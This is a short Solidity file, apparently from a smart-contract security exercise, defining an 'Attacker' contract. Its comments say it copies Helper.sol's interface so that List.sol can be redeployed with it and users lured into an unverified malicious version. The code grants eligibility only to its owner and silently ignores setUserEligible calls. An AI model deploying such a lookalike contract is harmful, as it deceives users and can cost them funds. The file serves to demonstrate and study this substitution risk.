//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;


/// this contract uses the same public variable, and functions names
/// as Helper.sol and as such will generate the same abi as Helper.sol
/// This makes it possible to redeploy list.sol with attacker.sol rather than helper.sol
/// for malicious purposes. 
/// And if list.sol is not verified on etherscan, it will be easy to lure people to use a malicious
/// version of list.sol with attacker.sol.
contract Attacker {
    address owner;
    mapping(address => bool) userEligible;

    constructor() {
        owner = msg.sender;
    }

    function isUserEligible(address user) public view returns(bool) {
        if(user == owner) {
            return true;
        }
        return false;
    }

    function setUserEligible(address user) public {
        userEligible[user] = true;
    }
    
    fallback() external {}
}